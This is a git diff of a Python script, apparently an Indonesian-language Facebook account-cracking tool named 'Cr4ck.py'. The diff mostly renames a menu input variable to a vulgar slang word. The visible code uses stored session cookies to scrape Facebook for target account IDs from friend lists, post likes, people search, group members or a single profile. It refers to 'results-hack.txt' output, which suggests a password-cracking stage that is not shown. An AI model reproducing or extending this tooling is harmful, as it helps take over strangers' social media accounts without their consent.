@@ -31,7 +31,7 @@ def baner():
 \x1b[1;94m────────────────────────────────────────────────────""")
 
 def balik():
-    yayan = input("\n\033[00m\t     [\033[96m Tekan Enter Untuk Kembali\033[97m ]")
+    yayan=input("\n\033[00m\t     [\033[96m Tekan Enter Untuk Kembali\033[97m ]")
     if yayan == "": 
        os.system("python Cr4ck.py")
     else:
@@ -201,13 +201,13 @@ def moch_yayan():
                    kata('\033[1;97m[\033[1;92m07\033[1;97m] \033[00mHapus Cookies')
                    kata('\033[1;97m[\033[1;91m00\033[1;97m] \033[00mExit')
                    kata('\x1b[1;94m────────────────────────────────────────────────────')
-                   tanya = input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
-                   if tanya =="":
+                   memek = input('\x1b[1;97m[\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
+                   if memek =="":
                          exit("\033[00m[\033[91m!\033[00m] Lihat Menu Dong")
-                   elif tanya == '0' or tanya =='00':
+                   elif memek == '0' or memek =='00':
                          kata("\n    \033[1;97m [\033[1;96m•\033[1;97m] Selamat Tinggal!")
                          exit()                   	
-                   elif tanya == '7' or tanya =='07':
+                   elif memek == '7' or memek =='07':
                          print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mMohon Tunggu... ")
                          kata("\x1b[1;92m • 10")
                          kata("\x1b[1;93m •• 20")
@@ -222,10 +222,10 @@ def moch_yayan():
                          os.system("rm -rf cookies")
                          print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Berhasil Terhapus!\n\n")
                          exit()
-                   elif tanya == '1' or tanya =='01':
+                   elif memek == '1' or memek =='01':
                          url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                          username = getid(mbasic.format(url["href"]))
-                   elif tanya == '2' or tanya =='02':
+                   elif memek == '2' or memek =='02':
                          username = input("\033[1;97m[\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                          if username == "":
                                  exit("\033[00m[\033[91m!\033[00m] Link Post Lo Slh!")
@@ -234,18 +234,18 @@ def moch_yayan():
                          elif 'm.facebook.com' in username:
                                  username = username.replace('m.facebook.com','mbasic.facebook.com')
                          username = fromlikes(username)
-                   elif tanya == '3' or tanya =='03':
+                   elif memek == '3' or memek =='03':
                          knf = input("\033[1;97m[\033[1;96m?\033[1;97m] Nama Yang Mau Anda Cari \033[1;91m: \033[1;92m")
                          username = bysearch(mbasic.format('/search/people/?q='+knf))
                          if len(username) == 0:
                                  exit("\033[90m[\033[91m!\033[00m] Tidak Ada Nama!")
-                   elif tanya == '4' or tanya =='04':
+                   elif memek == '4' or memek =='04':
                          print("\033[1;97m[\033[1;94m•\033[1;97m] Hanya Bisa Mengambil \033[91m100 \033[00mID ")
                          grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                          username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                          if len(username) == 0:
                                  exit("\033[00m[\033[91m!\033[00m] ID Grup Tidak ada!")
-                   elif tanya == '5' or tanya =='05':
+                   elif memek == '5' or memek =='05':
                          knf = input("\033[1;97m[\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                          if knf.isdigit():
                                  user = "/profile.php?id=" + knf
@@ -256,7 +256,7 @@ def moch_yayan():
                                  username = getid(mbasic.format(user))
                          except TypeError:
                                  exit("\033[00m[\033[91m!\033[00m] \033[97mUsername/ID Tidak Ada!")
-                   elif tanya == '6' or tanya =='06':
+                   elif memek == '6' or memek =='06':
                          try:
                                  file1 = open("results-check.txt").read()
                                  file2 = open("results-hack.txt").read()
